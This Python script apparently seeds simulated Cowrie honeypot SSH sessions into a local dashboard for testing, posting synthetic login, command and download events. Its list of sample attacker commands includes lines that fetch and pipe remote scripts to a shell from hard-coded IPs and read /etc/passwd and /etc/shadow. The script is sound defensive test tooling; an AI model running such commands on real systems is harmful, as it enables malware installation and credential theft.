#!/usr/bin/env python3
"""
Honeypot AI Data Seeder & Attack Simulator
Simulates realistic Cowrie Honeypot SSH/Telnet brute-force sessions,
command executions, and malware downloads into the Microservices ecosystem.
"""

import requests
import time
import random
from datetime import datetime, timedelta

GATEWAY_URL = "http://localhost:8080"
ATTACK_SERVICE_URL = "http://localhost:8081"

SAMPLE_IPS = [
    {"ip": "185.220.101.5", "country": "DE", "city": "Frankfurt"},
    {"ip": "194.26.29.112", "country": "RU", "city": "Moscow"},
    {"ip": "45.155.205.233", "country": "NL", "city": "Amsterdam"},
    {"ip": "103.149.28.140", "country": "CN", "city": "Beijing"},
    {"ip": "192.168.1.105", "country": "US", "city": "Ashburn"},
    {"ip": "10.0.0.45", "country": "US", "city": "Internal"}
]

USERNAMES = ["root", "admin", "kali", "test", "ubuntu", "user", "support", "guest"]
PASSWORDS = ["123456", "admin", "password", "toor", "qwerty", "12345678", "root123", "pass123"]

MALICIOUS_COMMANDS = [
    "uname -a",
    "whoami",
    "cat /etc/passwd",
    "wget http://185.220.101.5/botnet.sh -O /tmp/botnet.sh",
    "chmod +x /tmp/botnet.sh",
    "/tmp/botnet.sh",
    "rm -rf /tmp/botnet.sh",
    "ps aux | grep miner",
    "curl -s http://194.26.29.112/payload.bin | sh",
    "cat /etc/shadow"
]

def check_service(url, name):
    try:
        r = requests.get(f"{url}/health", timeout=2)
        print(f"[✓] {name} is ONLINE at {url}")
        return True
    except Exception:
        print(f"[!] {name} not responding at {url} (will try sending directly or test mode)")
        return False

def seed_attack_session(session_idx, target_url):
    src = random.choice(SAMPLE_IPS)
    sess_id = f"cowrie_sess_{int(time.time())}_{session_idx}"
    now_str = datetime.now().isoformat()

    # 1. Connection Event
    connect_event = {
        "eventid": "cowrie.session.connect",
        "session": sess_id,
        "src_ip": src["ip"],
        "src_port": random.randint(30000, 60000),
        "dst_ip": "192.168.1.200",
        "dst_port": 2222,
        "protocol": "SSH",
        "country": src["country"],
        "city": src["city"],
        "timestamp": now_str
    }
    requests.post(f"{target_url}/api/attacks/ingest", json=connect_event, timeout=3)

    # 2. Failed Login Attempts
    for _ in range(random.randint(2, 5)):
        u = random.choice(USERNAMES)
        p = random.choice(PASSWORDS)
        login_fail = {
            "eventid": "cowrie.login.failed",
            "session": sess_id,
            "username": u,
            "password": p,
            "src_ip": src["ip"],
            "timestamp": datetime.now().isoformat()
        }
        requests.post(f"{target_url}/api/attacks/ingest", json=login_fail, timeout=3)
        time.sleep(0.05)

    # 3. Successful Login (Simulating honeypot trap allowing the attacker in)
    success_user = random.choice(["root", "admin"])
    success_pass = random.choice(["123456", "admin"])
    login_succ = {
        "eventid": "cowrie.login.success",
        "session": sess_id,
        "username": success_user,
        "password": success_pass,
        "src_ip": src["ip"],
        "timestamp": datetime.now().isoformat()
    }
    requests.post(f"{target_url}/api/attacks/ingest", json=login_succ, timeout=3)

    # 4. Command Executions
    selected_cmds = random.sample(MALICIOUS_COMMANDS, random.randint(2, 4))
    for cmd in selected_cmds:
        cmd_event = {
            "eventid": "cowrie.command.input",
            "session": sess_id,
            "input": cmd,
            "src_ip": src["ip"],
            "timestamp": datetime.now().isoformat()
        }
        requests.post(f"{target_url}/api/attacks/ingest", json=cmd_event, timeout=3)
        time.sleep(0.05)

    # 5. File Download
    download_event = {
        "eventid": "cowrie.session.file_download",
        "session": sess_id,
        "url": f"http://{src['ip']}/payload_{session_idx}.bin",
        "outfile": f"malware_{session_idx}.sh",
        "shasum": f"e3b0c44298fc1c149afbf4c8996fb92427ae41e4649b934ca495991b7852b855",
        "timestamp": datetime.now().isoformat()
    }
    requests.post(f"{target_url}/api/attacks/ingest", json=download_event, timeout=3)

    # 6. Session Close
    close_event = {
        "eventid": "cowrie.session.closed",
        "session": sess_id,
        "duration": random.uniform(15.0, 180.0),
        "timestamp": datetime.now().isoformat()
    }
    requests.post(f"{target_url}/api/attacks/ingest", json=close_event, timeout=3)

    print(f"[+] Successfully seeded attack session: {sess_id} from IP: {src['ip']} ({src['country']})")

def main():
    print("=" * 60)
    print("  HONEYPOT AI MICROSERVICES DATA SEEDER")
    print("=" * 60)

    target_url = GATEWAY_URL
    if not check_service(GATEWAY_URL, "API Gateway"):
        if check_service(ATTACK_SERVICE_URL, "Attack Service"):
            target_url = ATTACK_SERVICE_URL
        else:
            print("[!] Neither Gateway (8080) nor Attack Service (8081) is currently running.")
            print("[i] Please start the Spring Boot microservices in Eclipse and run this script again.")
            return

    print(f"\n[*] Seeding 10 attack sessions to {target_url}...")
    for i in range(1, 11):
        try:
            seed_attack_session(i, target_url)
        except Exception as e:
            print(f"[-] Error seeding session {i}: {e}")

    print("\n[✓] Finished seeding Honeypot attack data!")
    print("[*] Open HoneySentinel (http://localhost:5173) to see real-time graphs and telemetry.")

if __name__ == "__main__":
    main()
